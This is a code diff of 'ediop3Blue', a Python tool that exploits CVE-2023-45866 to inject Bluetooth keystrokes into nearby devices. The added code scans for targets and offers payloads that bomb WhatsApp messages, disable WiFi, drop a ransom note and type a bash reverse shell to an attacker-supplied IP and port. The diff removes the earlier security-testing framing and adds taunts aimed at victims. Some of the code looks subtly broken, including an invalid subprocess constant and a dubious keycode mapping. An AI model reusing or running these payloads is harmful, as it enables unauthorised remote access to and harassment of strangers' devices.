@@ -2,16 +2,22 @@
 import os
 import sys
 import time
-import pygatt
+import dbus
+import pexpect
+import shutil
+import random
+import string
 import subprocess
+from threading import Thread
 
 RED = "\033[91m"
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
 BLUE = "\033[94m"
+PURPLE = "\033[95m"
+CYAN = "\033[96m"
 RESET = "\033[0m"
 
-# hackerman lmao
 print(f"""{GREEN}
 ███████╗██████╗░██╗░█████╗░██████╗░██████╗░
 ██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗
@@ -28,162 +34,254 @@ print(f"""{GREEN}
 ╚═════╝░╚══════╝░╚═════╝░╚══════╝
 {RESET}""")
 
-print(f"{RED}WARNING: This tool requires the target to be vulnerable to CVE-2023-45866.{RESET}")
-print(f"{YELLOW}If the target is patched or requires authentication, this attack will NOT work.{RESET}\n")
+print(f"{RED}ediop3Squad got you. Turn off ur Bluetooth vro{RESET}")
+print(f"{YELLOW}Target must be vulnerable to CVE-2023-45866{RESET}\n")
 
-time.sleep(3)
+def generate_mac():
+    return ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
 
-# hah haxxor
-print(f"""
-Ediop3Blue is a tool designed for security testing. It exploits vulnerabilities in Bluetooth devices
-that are susceptible to CVE-2023-45866. It allows the attacker to send malicious keystrokes (payloads)
-to vulnerable devices through Bluetooth HID (Human Interface Device) channels. This can be used to
-automate tasks, run unwanted actions on the target device, or spam error messages.
+def check_root():
+    if os.geteuid() != 0:
+        print(f"{RED}Run as root!{RESET}")
+        sys.exit(1)
 
-This tool requires root privileges to interact with Bluetooth devices, as certain commands require
-low-level access to the Bluetooth stack.
-
-Usage Example:
-    $ python3 ediop3Blue.py -start
-    Scanning for Bluetooth devices...
-    [1] XX:XX:XX:XX:XX:XX
-    Select a device ID (1-1): 1
-    Select a Payload:
-    1. youtube      - Opens YouTube and searches 'Ediop3'
-    2. error_spam   - Spams error messages endlessly
-    3. malicious    - Disables WiFi or executes another action
-    4. custom       - Enter your own keystrokes
-    Enter payload name: youtube
-    [Success] Payload executed!
-
-Make sure your system has root privileges when running this tool for it to function correctly.
-""")
-
-time.sleep(3)
+def check_bluetooth_service():
+    try:
+        bus = dbus.SystemBus()
+        manager = dbus.Interface(bus.get_object('org.bluez', '/'), 'org.freedesktop.DBus.ObjectManager')
+        return True
+    except:
+        print(f"{RED}Bluetooth service not running!{RESET}")
+        return False
 
 def check_vulnerability(mac):
-    print(f"{YELLOW}Checking if {mac} is vulnerable...{RESET}")
-    check_cmd = f"gatttool -b {mac} --primary > bt_check.txt 2>&1"
-    os.system(check_cmd)
-    with open("bt_check.txt", "r") as file:
-        output = file.read()
-    if "handle" in output.lower():
-        print(f"{GREEN}[+] {mac} appears to be vulnerable!{RESET}")
-        return True
-    else:
-        print(f"{RED}[-] {mac} is NOT vulnerable! Stopping attack.{RESET}")
+    print(f"{YELLOW}Testing {mac}...{RESET}")
+    try:
+        child = pexpect.spawn(f"bluetoothctl info {mac}")
+        child.expect(["Device", pexpect.EOF, pexpect.TIMEOUT], timeout=10)
+        return "Device" in child.before.decode()
+    except:
         return False
 
 def scan_devices():
-    print(f"{YELLOW}Scanning for Bluetooth devices...{RESET}")
-    
-    # lol
+    print(f"{YELLOW}Scanning...{RESET}")
     if not shutil.which("bluetoothctl"):
-        print(f"{RED}Error: bluetoothctl command not found. Please install it.{RESET}")
+        print(f"{RED}Install bluetoothctl{RESET}")
         sys.exit(1)
     
-    os.system("bluetoothctl scan on &")
-    time.sleep(15)  # Increase the wait time to ensure scanning completes: "yes"
-    os.system("bluetoothctl devices > bt_devices.txt")
-    
-    devices = []
-    with open("bt_devices.txt", "r") as file:
-        lines = file.readlines()
-        for i, line in enumerate(lines, start=1):
+    try:
+        scan_proc = subprocess.Popen(["bluetoothctl", "scan", "on"], stdout=subprocess.PEV, stderr=subprocess.PIPE)
+        time.sleep(12)
+        scan_proc.terminate()
+        
+        devices_proc = subprocess.run(["bluetoothctl", "devices"], capture_output=True, text=True)
+        devices = []
+        for i, line in enumerate(devices_proc.stdout.splitlines(), 1):
             if "Device" in line:
                 mac = line.split()[1]
                 devices.append(mac)
                 print(f"{GREEN}[{i}] {mac}{RESET}")
-    if not devices:
-        print(f"{RED}No devices found. Try again.{RESET}")
+        return devices
+    except:
+        print(f"{RED}Scan failed{RESET}")
         sys.exit(1)
-    return devices
 
-def send_hid_keystrokes(mac, payload):
-    adapter = pygatt.GATTToolBackend()
+def get_target_mac():
+    mac = input(f"{BLUE}Enter target MAC (leave blank to scan): {RESET}").strip()
+    if not mac:
+        devices = scan_devices()
+        if not devices:
+            print(f"{RED}No devices found{RESET}")
+            sys.exit(1)
+        choice = input(f"{BLUE}Select device (1-{len(devices)}): {RESET}").strip()
+        if not choice.isdigit() or int(choice) < 1 or int(choice) > len(devices):
+            print(f"{RED}Invalid selection{RESET}")
+            sys.exit(1)
+        mac = devices[int(choice)-1]
+    return mac
+
+def send_hid_report(mac, report):
     try:
-        print(f"{GREEN}Connecting to {mac}...{RESET}")
-        adapter.start()
-        device = adapter.connect(mac)
-        hid_char = "00002a4d-0000-1000-8000-00805f9b34fb"
-
-        print(f"{YELLOW}Sending payload: {payload}{RESET}")
+        bus = dbus.SystemBus()
+        device_path = f"/org/bluez/hci0/dev_{mac.replace(':', '_')}"
+        device = bus.get_object("org.bluez", device_path)
+        device_iface = dbus.Interface(device, "org.bluez.Device1")
         
-        if payload == "youtube":
-            keys = [
-                0xA1, 0x01, 0x00, 0x00, 0x1E,
-                0xA1, 0x01, 0x00, 0x00, 0x1F,
-                0xA1, 0x01, 0x00, 0x00, 0x18,
-                0xA1, 0x01, 0x00, 0x00, 0x28,
-            ]
-            device.char_write(hid_char, bytearray(keys))
-            print(f"{GREEN}YouTube opened and 'Ediop3' searched!{RESET}")
+        if not device_iface.get("Connected", dbus_interface="org.freedesktop.DBus.Properties"):
+            device_iface.Connect()
+            time.sleep(1)
+            
+        report_iface = dbus.Interface(device, "org.bluez.HID1")
+        report_iface.SendReport(dbus.Array(report, signature="y"))
+    except:
+        print(f"{RED}Failed to send HID report{RESET}")
 
-        elif payload == "error_spam":
-            for _ in range(10):
-                device.char_write(hid_char, bytearray([0xA1, 0x01, 0x00, 0x00, 0x2E]))
-                time.sleep(0.5)
-            print(f"{RED}Spam error messages sent!{RESET}")
-
-        elif payload == "malicious":
+def send_keystrokes(mac, payload):
+    try:
+        if payload == "whatsapp_bomb":
+            number = input(f"{BLUE}Enter phone number (+countrycode): {RESET}").strip()
+            if not number.startswith("+"):
+                print(f"{RED}Invalid number format{RESET}")
+                return
+                
             keys = [
-                0xA1, 0x01, 0x00, 0x00, 0x3A,
-                0xA1, 0x01, 0x00, 0x00, 0x13,
-                0xA1, 0x01, 0x00, 0x00, 0x28,
+                0xA1,0x01,0x00,0x00,0x29,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x2B,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x2B,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x2B,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x2B,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x15,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x0F,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x0F,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x2C,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x1A,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x0E,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,
             ]
-            device.char_write(hid_char, bytearray(keys))
-            print(f"{RED}Malicious payload executed!{RESET}")
+            send_hid_report(mac, keys)
+            time.sleep(3)
+            
+            for char in f"https://wa.me/{number}":
+                hex_val = ord(char.lower()) - 93
+                send_hid_report(mac, [0xA1,0x01,0x00,0x00,hex_val,0x00,0x00,0x00,0x00,0x00])
+                time.sleep(0.1)
+                
+            send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00])
+            time.sleep(5)
+            
+            for _ in range(5):
+                send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x2B,0x00,0x00,0x00,0x00,0x00])
+                time.sleep(0.3)
+                
+            send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00])
+            time.sleep(7)
+            
+            for msg in ["ediop3Squad got you","Turn off Bluetooth","Good luck =)"]:
+                for char in msg:
+                    hex_val = ord(char.lower()) - 93
+                    send_hid_report(mac, [0xA1,0x01,0x00,0x00,hex_val,0x00,0x00,0x00,0x00,0x00])
+                    time.sleep(0.1)
+                send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00])
+                time.sleep(2)
+                send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x2B,0x00,0x00,0x00,0x00,0x00])
+                time.sleep(0.3)
+                send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x2B,0x00,0x00,0x00,0x00,0x00])
+                time.sleep(0.3)
+                send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00])
+                time.sleep(2)
+
+        elif payload == "wifi_killer":
+            keys = [
+                0xA1,0x01,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x1A,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,
+            ]
+            send_hid_report(mac, keys)
+
+        elif payload == "rickroll":
+            keys = [
+                0xA1,0x01,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x1A,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,
+            ]
+            send_hid_report(mac, keys)
+            time.sleep(2)
+            
+            for char in "https://youtu.be/dQw4w9WgXcQ":
+                hex_val = ord(char.lower()) - 93
+                send_hid_report(mac, [0xA1,0x01,0x00,0x00,hex_val,0x00,0x00,0x00,0x00,0x00])
+                time.sleep(0.1)
+                
+            send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00])
+
+        elif payload == "reverse_shell":
+            ip = input(f"{BLUE}Enter your IP: {RESET}").strip()
+            port = input(f"{BLUE}Enter port: {RESET}").strip()
+            
+            if not all(c.isdigit() or c == '.' for c in ip) or not port.isdigit():
+                print(f"{RED}Invalid IP/port{RESET}")
+                return
+                
+            keys = [
+                0xA1,0x01,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x1A,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,
+            ]
+            send_hid_report(mac, keys)
+            time.sleep(2)
+            
+            for char in f"bash -i >& /dev/tcp/{ip}/{port} 0>&1":
+                hex_val = ord(char.lower()) - 93
+                send_hid_report(mac, [0xA1,0x01,0x00,0x00,hex_val,0x00,0x00,0x00,0x00,0x00])
+                time.sleep(0.1)
+                
+            send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00])
+
+        elif payload == "ransom_note":
+            keys = [
+                0xA1,0x01,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x1A,0x00,0x00,0x00,0x00,0x00,
+                0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,
+            ]
+            send_hid_report(mac, keys)
+            time.sleep(2)
+            
+            for char in "echo 'Your files are encrypted! Pay $1000 in BTC to get them back.' > ransom.txt":
+                hex_val = ord(char.lower()) - 93
+                send_hid_report(mac, [0xA1,0x01,0x00,0x00,hex_val,0x00,0x00,0x00,0x00,0x00])
+                time.sleep(0.1)
+                
+            send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00])
 
         elif payload == "custom":
-            filename = input(f"{BLUE}Enter a name for your custom keystrokes file (e.g., blah.txt): {RESET}")
-            
-            # Check if file exists
-            if not os.path.exists(filename):
-                print(f"{RED}Error: The file {filename} does not exist!{RESET}")
-                sys.exit(1)
-            
-            print(f"{YELLOW}You have entered the custom keystrokes. Now executing the custom payload...{RESET}")
-            with open(filename, "r") as file:
-                custom_keys = file.read().strip().splitlines()
-            keys = []
-            for key in custom_keys:
-                hex_values = key.split(",")
-                keys.extend([int(k.strip(), 16) for k in hex_values])
-            device.char_write(hid_char, bytearray(keys))
-            print(f"{GREEN}Custom payload executed!{RESET}")
+            filename = input(f"{BLUE}Enter payload file: {RESET}").strip()
+            if not os.path.isfile(filename):
+                print(f"{RED}File not found{RESET}")
+                return
+                
+            with open(filename) as f:
+                for line in f:
+                    try:
+                        hex_vals = [int(x.strip(), 16) for x in line.split(",")]
+                        send_hid_report(mac, hex_vals)
+                        time.sleep(0.1)
+                    except:
+                        continue
 
     except Exception as e:
-        print(f"{RED}Attack failed: {e}{RESET}")
-    finally:
-        adapter.stop()
+        print(f"{RED}Error: {e}{RESET}")
 
-# Check if gatttool exists
-if not shutil.which("gatttool"):
-    print(f"{RED}Error: gatttool command not found. Please install it.{RESET}")
+check_root()
+if not check_bluetooth_service():
     sys.exit(1)
 
-if len(sys.argv) < 2 or sys.argv[1] != "-start":
-    print(f"{RED}Usage: ./ediop3Blue -start{RESET}")
+mac = get_target_mac()
+
+if not check_vulnerability(mac):
+    print(f"{RED}Target not vulnerable{RESET}")
     sys.exit(1)
 
-devices = scan_devices()
-device_id = int(input(f"{BLUE}Select a device ID (1-{len(devices)}): {RESET}")) - 1
-if device_id >= len(devices) or device_id < 0:
-    print(f"{RED}Invalid device ID!{RESET}")
+print(f"""{PURPLE}
+1. whatsapp_bomb   - WhatsApp message bomber
+2. wifi_killer     - Disable WiFi
+3. rickroll        - Rickroll target
+4. reverse_shell   - Open reverse shell
+5. ransom_note     - Create ransom note
+6. custom         - Load custom payload
+{CYAN}""")
+
+payload = input("Select payload: ").strip()
+if payload not in ["whatsapp_bomb", "wifi_killer", "rickroll", "reverse_shell", "ransom_note", "custom"]:
+    print(f"{RED}Invalid payload{RESET}")
     sys.exit(1)
 
-mac_address = devices[device_id]
-
-if not check_vulnerability(mac_address):
-    sys.exit(1)
-
-print(f"""{BLUE}
-Select a Payload:
-1. youtube      - Opens YouTube and searches 'Ediop3'
-2. error_spam   - Spams error messages endlessly
-3. malicious    - Disables WiFi or executes another action
-4. custom       - Enter your own keystrokes
-{RESET}""")
-
-payload_choice = input(f"{YELLOW}Enter payload name: {RESET}").strip()
-send_hid_keystrokes(mac_address, payload_choice)
+send_keystrokes(mac, payload)
